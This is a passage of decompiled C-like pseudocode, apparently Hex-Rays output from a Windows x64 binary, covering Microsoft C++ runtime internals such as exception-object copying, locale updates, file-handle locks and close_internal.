  size_t sizeOrOffset; // rbx
  const void *v18; // rax
  __int64 v19; // rcx

  v8 = 0;
  if ( pCatch->dispType )
  {
    dispType = pCatch->dispType;
    v10 = dispType + GetImageBase();
  }
  else
  {
    v10 = 0i64;
    LODWORD(dispType) = 0;
  }
  if ( v10 )
  {
    v11 = (_DWORD)dispType ? pCatch->dispType + GetImageBase() : 0i64;
    if ( *(_BYTE *)(v11 + 16) && (pCatch->dispCatchObj || (pCatch->adjectives & 0x80000000) != 0) )
    {
      if ( (pCatch->adjectives & 0x80000000) == 0 )
        pRN = (__int64 *)(*pRN + pCatch->dispCatchObj);
      if ( SLOBYTE(pCatch->adjectives) < 0 && (pConv->properties & 0x10) != 0 && qword_7FF7021498C8 )
      {
        v12 = qword_7FF7021498C8();
        if ( !v12 || !pRN )
          abort();
        *pRN = v12;
        pExceptionObject = v12;
      }
      else if ( (pCatch->adjectives & 8) != 0 )
      {
        pExceptionObject = (__int64)pExcept->params.pExceptionObject;
        if ( !pExceptionObject || !pRN )
          abort();
        *pRN = pExceptionObject;
      }
      else
      {
        if ( (pConv->properties & 1) == 0 )
        {
          if ( pConv->copyFunction )
          {
            copyFunction = pConv->copyFunction;
            v16 = copyFunction + GetThrowImageBase();
          }
          else
          {
            v16 = 0i64;
            LODWORD(copyFunction) = 0;
          }
          if ( v16 )
          {
            if ( !pExcept->params.pExceptionObject
              || !pRN
              || (!(_DWORD)copyFunction ? (v19 = 0i64) : (v19 = pConv->copyFunction + GetThrowImageBase()), !v19) )
            {
              abort();
            }
            return (unsigned int)((pConv->properties & 4) != 0) + 1;
          }
          else
          {
            if ( !pExcept->params.pExceptionObject || !pRN )
              abort();
            sizeOrOffset = pConv->sizeOrOffset;
            v18 = (const void *)_AdjustPointer(pExcept->params.pExceptionObject, &pConv->thisDisplacement);
            memmove(pRN, v18, sizeOrOffset);
          }
          return v8;
        }
        v14 = pExcept->params.pExceptionObject;
        if ( !v14 || !pRN )
          abort();
        memmove(pRN, v14, pConv->sizeOrOffset);
        if ( pConv->sizeOrOffset != 8 || !*pRN )
          return v8;
        pExceptionObject = *pRN;
      }
      *pRN = _AdjustPointer(pExceptionObject, &pConv->thisDisplacement);
      return v8;
    }
  }
  return 0i64;
}
// 7FF702103E14: using guessed type __int64 __fastcall _AdjustPointer(_QWORD, _QWORD);
// 7FF702104CCC: using guessed type __int64 GetImageBase(void);
// 7FF702104CE0: using guessed type __int64 GetThrowImageBase(void);
// 7FF7021498C8: using guessed type __int64 (*qword_7FF7021498C8)(void);

//----- (00007FF70210636C) ----------------------------------------------------
void __fastcall std::invalid_argument::invalid_argument(
        std::invalid_argument *this,
        const std::invalid_argument *__that)
{
  *(_QWORD *)this = &std::exception::`vftable';
  *(_OWORD *)((char *)this + 8) = 0i64;
  _std_exception_copy((char *)__that + 8);
  *(_QWORD *)this = &std::bad_exception::`vftable';
}
// 7FF702106BA8: using guessed type __int64 __fastcall _std_exception_copy(_QWORD);
// 7FF7021143B0: using guessed type void *std::exception::`vftable';
// 7FF7021143E0: using guessed type void *std::bad_exception::`vftable';

//----- (00007FF7021063A8) ----------------------------------------------------
_QWORD *__fastcall sub_7FF7021063A8(_QWORD *a1)
{
  a1[2] = 0i64;
  a1[1] = "bad exception";
  *a1 = &std::bad_exception::`vftable';
  return a1;
}
// 7FF7021143E0: using guessed type void *std::bad_exception::`vftable';

//----- (00007FF702106B60) ----------------------------------------------------
__int64 __fastcall CallSettingFrameEncoded(__int64 a1, __int64 a2, __int64 a3, unsigned int a4)
{
  void (__fastcall *v4)(__int64); // rax
  __int64 v5; // rax

  v4 = (void (__fastcall *)(__int64))NLG_Notify(a1, a2, a4);
  v4(a3);
  v5 = _NLG_Return2();
  return NLG_Notify(v5, a2, 2i64);
}
// 7FF7021042B0: using guessed type __int64 __fastcall NLG_Notify(_QWORD, _QWORD, _QWORD);
// 7FF7021042E0: using guessed type __int64 _NLG_Return2(void);

//----- (00007FF702107728) ----------------------------------------------------
__int64 sub_7FF702107728()
{
  return (unsigned int)dword_7FF702149A30;
}
// 7FF702149A30: using guessed type int dword_7FF702149A30;

//----- (00007FF702107730) ----------------------------------------------------
void __fastcall sub_7FF702107730(int a1)
{
  dword_7FF702149A30 = a1;
}
// 7FF702149A30: using guessed type int dword_7FF702149A30;

//----- (00007FF702107758) ----------------------------------------------------
void __fastcall sub_7FF702107758(__int64 a1)
{
  qword_7FF702149A38 = a1;
}
// 7FF702149A38: using guessed type __int64 qword_7FF702149A38;

//----- (00007FF702107E10) ----------------------------------------------------
__int64 __fastcall sub_7FF702107E10(void **a1)
{
  void *v1; // rcx
  __int64 result; // rax

  v1 = *a1;
  if ( v1 != qword_7FF702149B60 )
    return unknown_libname_14(v1);
  return result;
}

//----- (00007FF702107E2C) ----------------------------------------------------
__int64 __fastcall sub_7FF702107E2C(void **a1)
{
  void *v1; // rcx
  __int64 result; // rax

  v1 = *a1;
  if ( v1 != qword_7FF702149B58 )
    return unknown_libname_14(v1);
  return result;
}

//----- (00007FF70210824C) ----------------------------------------------------
void __fastcall sub_7FF70210824C(__int64 a1)
{
  qword_7FF702149B70 = a1;
}
// 7FF702149B70: using guessed type __int64 qword_7FF702149B70;

//----- (00007FF702108334) ----------------------------------------------------
int *sub_7FF702108334()
{
  return &dword_7FF702149B88;
}
// 7FF702149B88: using guessed type int dword_7FF702149B88;

//----- (00007FF70210833C) ----------------------------------------------------
void **sub_7FF70210833C()
{
  return &qword_7FF702149B90;
}

//----- (00007FF70210845C) ----------------------------------------------------
__int64 sub_7FF70210845C()
{
  return (unsigned int)dword_7FF702149BB4;
}
// 7FF702149BB4: using guessed type int dword_7FF702149BB4;

//----- (00007FF702108490) ----------------------------------------------------
void *sub_7FF702108490()
{
  return &unk_7FF702149BB8;
}

//----- (00007FF7021087E0) ----------------------------------------------------
int __fastcall sub_7FF7021087E0(_onexit_t Function)
{
  return register_onexit_function(&stru_7FF702149BC0, Function);
}

//----- (00007FF70210892C) ----------------------------------------------------
__vcrt_bool sub_7FF70210892C()
{
  return _vcrt_uninitialize(0);
}

//----- (00007FF702108D80) ----------------------------------------------------
void __fastcall sub_7FF702108D80(__int64 a1)
{
  qword_7FF702149BF0 = a1;
}
// 7FF702149BF0: using guessed type __int64 qword_7FF702149BF0;

//----- (00007FF702109224) ----------------------------------------------------
void __fastcall __spoils<rax,rcx,rdx,r8,r9,r10,r11,xmm0,xmm4,xmm5> _acrt_update_locale_info(
        __acrt_ptd *const ptd,
        __crt_multibyte_data **const multibyte_info)
{
  if ( *multibyte_info != (__crt_multibyte_data *)qword_7FF702149BF8
    && (*((_DWORD *)ptd + 234) & dword_7FF70211E7B0) == 0 )
  {
    *multibyte_info = (__crt_multibyte_data *)_acrt_update_thread_locale_data();
  }
}
// 7FF70210C7B4: using guessed type __int64 _acrt_update_thread_locale_data(void);
// 7FF70211E7B0: using guessed type int dword_7FF70211E7B0;
// 7FF702149BF8: using guessed type __int64 qword_7FF702149BF8;

//----- (00007FF702109258) ----------------------------------------------------
void __fastcall _acrt_update_locale_info_explicit(
        __acrt_ptd *const ptd,
        __crt_locale_data **const locale_info,
        const unsigned __int64 current_global_state_index)
{
  if ( *locale_info != (__crt_locale_data *)qword_7FF702149BF8[current_global_state_index]
    && (*((_DWORD *)ptd + 234) & dword_7FF70211E7B0) == 0 )
  {
    *locale_info = (__crt_locale_data *)_acrt_update_thread_locale_data();
  }
}
// 7FF70210C7B4: using guessed type __int64 _acrt_update_thread_locale_data(void);
// 7FF70211E7B0: using guessed type int dword_7FF70211E7B0;
// 7FF702149BF8: using guessed type __int64 qword_7FF702149BF8[];

//----- (00007FF702109290) ----------------------------------------------------
void __fastcall __spoils<rax,rcx,rdx,r8,r9,r10,r11,xmm0,xmm4,xmm5> _acrt_update_locale_info_0(
        __acrt_ptd *const ptd,
        __crt_multibyte_data **const multibyte_info)
{
  if ( *multibyte_info != Block && (*((_DWORD *)ptd + 234) & dword_7FF70211E7B0) == 0 )
    *multibyte_info = (__crt_multibyte_data *)_acrt_update_thread_multibyte_data();
}
// 7FF70210AFC0: using guessed type __int64 _acrt_update_thread_multibyte_data(void);
// 7FF70211E7B0: using guessed type int dword_7FF70211E7B0;

//----- (00007FF7021092C4) ----------------------------------------------------
void __fastcall _acrt_update_locale_info_explicit_0(
        __acrt_ptd *const ptd,
        __crt_locale_data **const locale_info,
        const unsigned __int64 current_global_state_index)
{
  if ( *locale_info != *(&Block + current_global_state_index) && (*((_DWORD *)ptd + 234) & dword_7FF70211E7B0) == 0 )
    *locale_info = (__crt_locale_data *)_acrt_update_thread_multibyte_data();
}
// 7FF70210AFC0: using guessed type __int64 _acrt_update_thread_multibyte_data(void);
// 7FF70211E7B0: using guessed type int dword_7FF70211E7B0;

//----- (00007FF70210B9D0) ----------------------------------------------------
void __fastcall sub_7FF70210B9D0(int a1)
{
  EnterCriticalSection((LPCRITICAL_SECTION)&unk_7FF702149C20 + a1);
}

//----- (00007FF70210BA24) ----------------------------------------------------
void __fastcall sub_7FF70210BA24(int a1)
{
  LeaveCriticalSection((LPCRITICAL_SECTION)&unk_7FF702149C20 + a1);
}

//----- (00007FF70210BC1C) ----------------------------------------------------
void __fastcall _acrt_lowio_lock_fh(int fh)
{
  EnterCriticalSection((LPCRITICAL_SECTION)(qword_7FF702149E60[(__int64)fh >> 6] + 72i64 * (fh & 0x3F)));
}
// 7FF702149E60: using guessed type __int64 qword_7FF702149E60[128];

//----- (00007FF70210BC44) ----------------------------------------------------
void __fastcall _acrt_lowio_lock_fh_0(int fh)
{
  LeaveCriticalSection((LPCRITICAL_SECTION)(qword_7FF702149E60[(__int64)fh >> 6] + 72i64 * (fh & 0x3F)));
}
// 7FF702149E60: using guessed type __int64 qword_7FF702149E60[128];

//----- (00007FF70210CECC) ----------------------------------------------------
char sub_7FF70210CECC()
{
  hHeap = 0i64;
  return 1;
}

//----- (00007FF70210CFB4) ----------------------------------------------------
void __fastcall sub_7FF70210CFB4(__int64 a1)
{
  qword_7FF70214A410 = a1;
}
// 7FF70214A410: using guessed type __int64 qword_7FF70214A410;

//----- (00007FF70210D804) ----------------------------------------------------
void __fastcall sub_7FF70210D804(__int64 a1)
{
  EnterCriticalSection((LPCRITICAL_SECTION)(a1 + 48));
}

//----- (00007FF70210D810) ----------------------------------------------------
void __fastcall sub_7FF70210D810(__int64 a1)
{
  LeaveCriticalSection((LPCRITICAL_SECTION)(a1 + 48));
}

//----- (00007FF702110BC8) ----------------------------------------------------
BOOL sub_7FF702110BC8()
{
  BOOL result; // eax

  if ( (unsigned __int64)hObject <= 0xFFFFFFFFFFFFFFFDui64 )
    return CloseHandle(hObject);
  return result;
}

//----- (00007FF702110D1C) ----------------------------------------------------
__int64 __fastcall close_internal(unsigned int fh, __crt_cached_ptd_host *ptd)
{
  unsigned int v3; // [rsp+30h] [rbp-28h] BYREF
  __int64 v4[4]; // [rsp+38h] [rbp-20h] BYREF
  unsigned int v5; // [rsp+60h] [rbp+8h] BYREF
  char v6; // [rsp+70h] [rbp+18h] BYREF
  unsigned int v7; // [rsp+78h] [rbp+20h] BYREF

  v5 = fh;
  if ( fh == -2 )
  {
    *((_BYTE *)ptd + 56) = 1;
    *((_DWORD *)ptd + 13) = 0;
    *((_BYTE *)ptd + 48) = 1;
    *((_DWORD *)ptd + 11) = 9;
  }
  else
  {
    if ( (fh & 0x80000000) == 0
      && fh < dword_7FF70214A260
      && (*(_BYTE *)(qword_7FF702149E60[(__int64)(int)fh >> 6] + 72i64 * (fh & 0x3F) + 56) & 1) != 0 )
    {
      v4[1] = (__int64)ptd;
      v7 = fh;
      v3 = fh;
      v4[0] = (__int64)&v5;
      return __crt_seh_guarded_call<int>::operator()<_lambda_ad8af0d99a0adf03d037d7dffe354bb5_,_lambda_c9ba49e555ba839a7b07aa3fbecb7617_ &,_lambda_2f1ebd5d68526518146ae959c9e734c8_>(
               &v6,
               &v3,
               v4,
               &v7);
    }
    *((_BYTE *)ptd + 56) = 1;
    *((_DWORD *)ptd + 13) = 0;
    *((_BYTE *)ptd + 48) = 1;
    *((_DWORD *)ptd + 11) = 9;
    invalid_parameter_internal(0i64, 0i64, 0i64, 0, 0i64, ptd);
  }
  return 0xFFFFFFFFi64;
}
// 7FF702110CA4: using guessed type __int64 __fastcall __crt_seh_guarded_call<int>::operator()<_lambda_ad8af0d99a0adf03d037d7dffe354bb5_,_lambda_c9ba49e555ba839a7b07aa3fbecb7617_ &,_lambda_2f1ebd5d68526518146ae959c9e734c8_>(_QWORD, _QWORD, _QWORD, _QWORD);
// 7FF702149E60: using guessed type __int64 qword_7FF702149E60[128];
// 7FF70214A260: using guessed type int dword_7FF70214A260;

//----- (00007FF7021117BC) ----------------------------------------------------
llvm::AttributeImpl *__fastcall __spoils<rcx,rdx,r8,r9,r10,r11,xmm0,xmm4,xmm5> llvm::AttributeImpl::`scalar deleting destructor'(
        llvm::AttributeImpl *this,
        char a2)
{
  *(_QWORD *)this = &type_info::`vftable';
  if ( (a2 & 1) != 0 )
    j_j_free(this);
  return this;
}
// 7FF70211A878: using guessed type void *type_info::`vftable';

// nfuncs=431 queued=58 decompiled=58 lumina nreq=0 worse=0 better=0
// ALL OK, 58 function(s) have been successfully decompiled
